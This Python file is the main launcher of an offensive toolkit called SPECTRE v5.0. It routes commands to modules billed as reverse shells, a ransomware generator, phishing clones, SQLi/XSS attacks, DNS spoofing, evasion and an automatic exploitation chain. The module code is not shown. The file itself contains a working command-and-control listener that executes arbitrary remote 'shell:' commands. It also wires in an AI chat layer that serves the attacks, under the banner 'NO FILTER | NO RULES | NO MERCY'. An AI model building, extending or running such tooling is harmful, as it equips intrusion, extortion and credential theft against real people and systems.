#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#  SPECTRE v5.0 - MAIN CLI
#  👻 AUTHOR: イズミー (IZUMI)
# ============================================================

import os
import sys
import time
import subprocess
from pathlib import Path

BASE = Path(__file__).resolve().parent
sys.path.insert(0, str(BASE))

from core import (cfg, log, C, Utils, print_banner,
                   store, SessionFactory, Writer, Fore, Style)


COMMANDS = {
    "geoip":"Geolocation", "breach":"HIBP check", "darkweb":"Paste leak check",
    "phone":"Phone lookup", "port":"Port scan", "whois":"WHOIS",
    "dns":"DNS enum", "subdomain":"Subdomain", "email":"Email harvest",
    "ssl":"SSL/TLS", "social":"Social check", "tech":"Tech detect",
    "dir":"Dir brute", "async":"Async recon", "shodan":"Shodan lookup",
    "sqli":"SQLi/XSS", "backdoor":"Reverse shell", "ransomware":"Ransomware gen",
    "phishing":"Phishing clone", "crypto":"Crypto wallet", "wifi":"WiFi scan",
    "dns-spoof":"DNS spoof helper", "yara":"YARA scan", "msf":"Metasploit RPC",
    "evasion":"Evasion suite", "autopwn":"Auto-pwn chain",
    "all":"Run all", "web":"Web UI", "c2":"C2 listener",
    "ai":"AI chat", "report":"Report", "db":"DB stats",
    "init":"Init config", "plugins":"List plugins", "help":"Help",
}


def show_help():
    print_banner()
    print(Fore.MAGENTA + "╔══════════════════════════════════════════════════════════╗")
    print(Fore.MAGENTA + "║  📖 SPECTRE v5.0 - COMMANDS                              ║")
    print(Fore.MAGENTA + "╚══════════════════════════════════════════════════════════╝")
    print()
    print(Fore.CYAN + "  RECON:")
    for k in ["geoip","breach","darkweb","phone","port","whois","dns",
              "subdomain","email","ssl","social","tech","dir","async","shodan"]:
        print(f"    {Fore.YELLOW}--{k:<12}{Fore.WHITE} {COMMANDS[k]}")
    print()
    print(Fore.RED + "  ATTACK:")
    for k in ["sqli","backdoor","ransomware","phishing","crypto","wifi","dns-spoof"]:
        print(f"    {Fore.YELLOW}--{k:<12}{Fore.WHITE} {COMMANDS[k]}")
    print()
    print(Fore.MAGENTA + "  EXPLOIT:")
    for k in ["yara","msf","evasion","autopwn"]:
        print(f"    {Fore.YELLOW}--{k:<12}{Fore.WHITE} {COMMANDS[k]}")
    print()
    print(Fore.GREEN + "  SYSTEM:")
    for k in ["all","web","c2","ai","report","db","init","plugins","help"]:
        print(f"    {Fore.YELLOW}--{k:<12}{Fore.WHITE} {COMMANDS[k]}")
    print()
    print(Fore.CYAN + "  EXAMPLES:")
    for ex in [
        "python spectre.py --geoip 8.8.8.8",
        "python spectre.py --port scanme.nmap.org",
        "python spectre.py --tech example.com",
        "python spectre.py --async example.com",
        "python spectre.py --backdoor 10.0.0.5:4444",
        "python spectre.py --all target.com",
        "python spectre.py --web",
        "python spectre.py --db",
    ]:
        print(f"    {Fore.GREEN}{ex}")
    print()
    print(Fore.RED + "  💀 NO FILTER | NO RULES | NO MERCY 💀\n")


MODULE_MAP = {
    "geoip":("GeoIPModule","geoip"),
    "breach":("BreachModule","breach"),
    "darkweb":("DarkWebModule","darkweb"),
    "phone":("PhoneModule","phone"),
    "port":("PortModule","portscan"),
    "whois":("WhoisModule","whois"),
    "dns":("DNSModule","dns"),
    "subdomain":("SubdomainModule","subdomain"),
    "email":("EmailModule","email_harvest"),
    "ssl":("SSLModule","ssl"),
    "social":("SocialModule","social"),
    "tech":("TechModule","tech"),
    "dir":("DirModule","dir_brute"),
    "async":("AsyncReconModule","async_recon"),
    "shodan":("ShodanModule","shodan"),
    "sqli":("SQLiModule","sqli"),
    "backdoor":("BackdoorModule","backdoor"),
    "ransomware":("RansomwareModule","ransomware"),
    "phishing":("PhishingModule","phishing"),
    "crypto":("CryptoModule","crypto"),
    "wifi":("WiFiModule","wifi"),
    "dns-spoof":("DNSSpoofModule","dns_spoof"),
    "yara":("YaraModule","yara"),
    "msf":("MSFModule","msf"),
    "evasion":("EvasionModule","evasion"),
    "autopwn":("AutoPwnModule","auto_pwn"),
}


def run_module(arg_key: str, target: str):
    try:
        import modules
    except ImportError as e:
        print(C.e(f"modules.py not found: {e}"))
        return
    cls_name, mod_name = MODULE_MAP[arg_key]
    cls = getattr(modules, cls_name, None)
    if not cls:
        print(C.e(f"Class not found: {cls_name}"))
        return
    try:
        cls(target).run()
    except KeyboardInterrupt:
        print(C.w("\nInterrupted"))
    except Exception as e:
        print(C.e(f"Failed: {e}"))
        import traceback
        traceback.print_exc()


def run_all(target: str):
    try:
        from modules import ALL_MODULES
    except ImportError:
        print(C.e("modules.py not found"))
        return
    print_banner()
    print(Fore.RED + "╔══════════════════════════════════════════════════════════╗")
    print(Fore.RED + "║  🔥 RUNNING ALL MODULES 🔥                              ║")
    print(Fore.RED + "╚══════════════════════════════════════════════════════════╝")
    print(C.j(f"Target: {target}"))
    print()
    total = len(ALL_MODULES)
    for i, (name, cls) in enumerate(ALL_MODULES.items(), 1):
        print(Fore.YELLOW + f"[{i}/{total}] {name}" + Style.RESET_ALL)
        try:
            cls(target).run()
        except KeyboardInterrupt:
            print(C.w("Interrupted"))
            break
        except Exception as e:
            print(C.e(f"{name}: {e}"))
        time.sleep(0.2)
    # AI report
    try:
        from ai_layer import ai
        if ai().ready:
            print()
            print(C.a("AI Report..."))
            data = store().history(target, limit=50)
            report = ai().report(target, data)
            print()
            print(Fore.MAGENTA + "╔══════════════════════════════════════════════════════════╗")
            print(Fore.MAGENTA + "║  🤖 AI REPORT                                           ║")
            print(Fore.MAGENTA + "╚══════════════════════════════════════════════════════════╝")
            print(report)
            fn = f"ai_report_{Utils.safe_filename(target)}_{Utils.timestamp()}.txt"
            Writer.text(fn, report)
            print(C.s(f"Saved: {fn}"))
    except Exception:
        pass
    print()
    print(C.h("✅ ALL COMPLETE 💀"))


def run_web():
    try:
        from web import run_web
        run_web()
    except ImportError as e:
        print(C.e(f"Web failed: {e}"))
        print(C.i("pip install fastapi uvicorn[standard] python-multipart"))


def run_c2():
    print_banner()
    print(C.a("Starting C2..."))
    try:
        from c2 import c2
        mgr = c2()
        mgr.load()
        print(C.i(f"Channels: {mgr.status()}"))
        if not mgr.channels:
            print(C.w("No C2 active. Update config.yaml c2 section"))
            return
        def handler(cmd):
            if cmd.startswith("shell:"):
                c = cmd[6:].strip()
                try:
                    return subprocess.check_output(c, shell=True,
                                                    stderr=subprocess.STDOUT,
                                                    text=True, timeout=30)
                except Exception as e:
                    return f"Error: {e}"
            if cmd == "whoami":
                return subprocess.check_output("whoami", shell=True, text=True)
            if cmd == "pwd":
                return subprocess.check_output("pwd", shell=True, text=True)
            return None
        mgr.register_default_handler(handler)
        mgr.broadcast("🟢 SPECTRE v5 C2 online")
        mgr.start_all()
        print(C.s("C2 running. Ctrl+C to stop"))
        try:
            while True:
                time.sleep(5)
        except KeyboardInterrupt:
            print(C.w("Stopping..."))
            mgr.stop_all()
    except Exception as e:
        print(C.e(f"C2: {e}"))


def run_ai():
    print_banner()
    try:
        from ai_layer import ai
    except ImportError:
        print(C.e("ai_layer.py not found"))
        return
    engine = ai()
    print(C.a(f"Provider: {engine.provider_label} | Ready: {engine.ready}"))
    print()
    if not engine.ready:
        print(C.w("AI not ready. Configure in config.yaml"))
        return
    print(C.i("Chat mode. 'exit' to quit, 'target <x>' to set target."))
    print()
    target = ""
    while True:
        try:
            q = input(Fore.CYAN + "You > " + Style.RESET_ALL).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not q:
            continue
        if q.lower() in ("exit","quit","q"):
            break
        if q.lower().startswith("target "):
            target = q[7:].strip()
            print(C.s(f"Target: {target}"))
            continue
        context = ""
        if target:
            rows = store().history(target, limit=10)
            context = "\n".join(str(r) for r in rows)
        print()
        print(C.a("SPECTRE: "), end="", flush=True)
        resp = engine.chat(q, target=target, context=context)
        print(resp)
        print()


def show_db():
    print_banner()
    s = store().stats()
    print(C.a("Stats:"))
    for k, v in s.items():
        print(f"    {Fore.YELLOW}{k}: {Fore.WHITE}{v}")
    print()
    print(C.a("Targets:"))
    for t in store().targets()[:10]:
        print(f"    {Fore.CYAN}{t}")
    print()
    print(C.a("Recent scans:"))
    for row in store().dump(limit=10):
        print(f"    [{row['ts']}] {row['target']} | {row['module']} | {row['severity']}")


def run_report(target=None):
    print_banner()
    print(C.a(f"Report: {target or 'all'}"))
    rows = store().dump(limit=500) if not target else store().history(target, limit=200)
    if not rows:
        print(C.w("No data"))
        return
    for r in rows[:50]:
        if isinstance(r, dict):
            print(f"  [{r.get('ts')}] {r.get('module')} | {r.get('severity')}")
            print(f"    {str(r.get('data'))[:200]}")


def list_plugins():
    print_banner()
    try:
        from plugin_loader import PluginLoader
        loader = PluginLoader("plugins")
        loader.load_all()
        plugins = loader.list_plugins()
        if not plugins:
            print(C.w("No plugins"))
            return
        print(C.a(f"Plugins ({len(plugins)}):"))
        for p in plugins:
            print(f"    {Fore.YELLOW}{p['name']} v{p['version']}")
            print(f"      {p['description']}")
    except Exception as e:
        print(C.e(f"Failed: {e}"))


def init_setup():
    print_banner()
    print(C.a("Init setup..."))
    for d in ["logs", "plugins", "reports"]:
        Path(d).mkdir(exist_ok=True)
        print(C.s(f"Created: {d}/"))
    if not Path("config.yaml").exists():
        print(C.w("config.yaml missing — copy dari repo"))
    try:
        from plugin_loader import ensure_example_plugin
        ensure_example_plugin(Path("plugins"))
    except Exception:
        pass
    print(C.h("Init done 💀"))


def main():
    if len(sys.argv) < 2:
        show_help()
        return
    args = sys.argv[1:]
    cmd = args[0].lstrip("-")

    if cmd in ("help", "h", "?"):
        show_help(); return
    if cmd == "web":
        run_web(); return
    if cmd == "c2":
        run_c2(); return
    if cmd == "ai":
        run_ai(); return
    if cmd == "db":
        show_db(); return
    if cmd == "init":
        init_setup(); return
    if cmd == "plugins":
        list_plugins(); return

    target = args[1] if len(args) > 1 else None
    if cmd == "report":
        run_report(target); return
    if cmd == "all":
        if not target:
            print(C.e("Usage: python spectre.py --all <target>")); return
        run_all(target); return

    if cmd not in MODULE_MAP:
        print(C.e(f"Unknown: --{cmd}"))
        print(C.i("Run: python spectre.py --help"))
        return
    if not target:
        print(C.e(f"Usage: python spectre.py --{cmd} <target>"))
        return
    if cmd in ("wifi", "ransomware"):
        target = target or "localhost"

    print_banner()
    run_module(cmd, target)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(C.w("\nInterrupted"))
        sys.exit(0)
    except Exception as e:
        print(C.e(f"Fatal: {e}"))
        import traceback
        traceback.print_exc()
        sys.exit(1)